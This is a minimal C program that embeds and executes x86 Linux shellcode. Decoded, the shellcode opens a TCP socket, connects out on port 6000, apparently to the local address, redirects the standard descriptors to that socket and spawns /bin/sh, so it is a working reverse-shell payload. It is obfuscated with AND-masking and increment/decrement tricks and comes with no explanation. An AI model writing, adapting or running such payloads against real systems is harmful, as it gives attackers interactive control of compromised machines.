#include <stdio.h>
#include <string.h>

int main(void)
{
	unsigned char code[] = \
	"\x89\xe5\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x81\xe1\x01\x01\x01\x01\x81\xe1\x02\x02\x02\x02\x29\xd2\x50\x50\x50\x66\x68\x17\x70\x66\x6a\x02\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x81\xe3\x01\x01\x01\x01\x81\xe3\x02\x02\x02\x02\x66\xb8\x68\x01\x66\x48\xb3\x03\xfe\xcb\xb1\x02\xfe\xc9\xcd\x80\x89\xc3\x66\xb8\x6b\x01\x66\x48\x89\xe1\x89\xea\x29\xe2\xcd\x80\x81\xe1\x01\x01\x01\x01\x81\xe1\x02\x02\x02\x02\xb1\x04\xfe\xc9\x29\xc0\xb0\x40\xfe\xc8\x49\xcd\x80\x41\xe2\xf4\x31\xc0\x29\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0c\xfe\xc8\xcd\x80" ;
	printf("Shellcode length: %d\n", strlen(code)); 
	void (*s)() = (void *)code;
	s();
	return 0;
}